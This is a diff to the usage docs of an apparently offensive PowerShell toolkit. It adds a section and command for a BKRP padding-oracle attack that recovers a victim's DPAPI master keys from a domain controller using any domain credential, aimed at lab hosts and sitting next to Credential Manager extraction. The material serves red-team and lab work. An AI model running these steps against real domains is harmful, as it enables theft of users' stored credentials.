@@ -133,8 +133,17 @@ $userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.l
 
 After this, cmdlets that encounter DPAPI blobs may be able to reuse cached master keys without you re-supplying `-MasterKeys` every time (example: `Get-TBOCredManEntry`).
 
+If the victim's credentials are unavailable but you have their master key **file** (via Backup Operator access to the roaming profile share), use the BKRP padding oracle attack against a DC instead — any valid domain credential is sufficient:
+
+```powershell
+# ~50 000 RPC queries to the DC; expect 15–60+ minutes for 2048-bit RSA.
+Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User |
+  Invoke-TBODpapiMasterKeyBkrp -DomainController corp1-dc01.corp1.lab.home-labs.lol
+```
+
 Reference:
 - [Docs/Usage.md#get-tbodpapimasterkeys](Usage.md#get-tbodpapimasterkeys)
+- [Docs/Usage.md#invoke-tbodpapimasterkeybkrp](Usage.md#invoke-tbodpapimasterkeybkrp)
 - [Docs/Usage.md#get-tbocredmanentry](Usage.md#get-tbocredmanentry)
 
 ### Export Cache For Offline Triage/Ingestion
